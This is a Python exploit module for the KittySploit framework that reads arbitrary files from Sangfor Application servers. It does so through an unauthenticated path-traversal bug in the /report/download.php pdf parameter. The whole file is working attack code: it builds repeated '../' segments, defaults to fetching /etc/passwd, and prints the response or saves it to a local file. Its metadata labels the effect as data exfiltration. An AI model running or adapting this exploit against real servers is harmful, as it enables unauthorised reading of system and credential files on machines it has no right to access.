#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sangfor Application download.php pdf parameter file read."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Sangfor Application - download.php File Read',
        'description': (
            'Reads arbitrary files via Sangfor Application /report/download.php?pdf= traversal.'
        ),
        'author': ['KittySploit Team'],
        'platform': Platform.LINUX,
        'references': [
            'https://github.com/Threekiii/Awesome-POC/blob/main/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
        ],
        'tags': ['sangfor', 'lfi', 'file-read', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'suggested_followups': ['scanner/http/sangfor_download_lfi_detect'],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)
    traversal_depth = OptInteger(5, 'Number of ../ segments', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        depth = max(1, int(self.traversal_depth or 5))
        trav = '../' * depth + remote
        path = f'/report/download.php?pdf={trav}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        return (r.text or '') if r else ''

    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} via Sangfor download.php ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
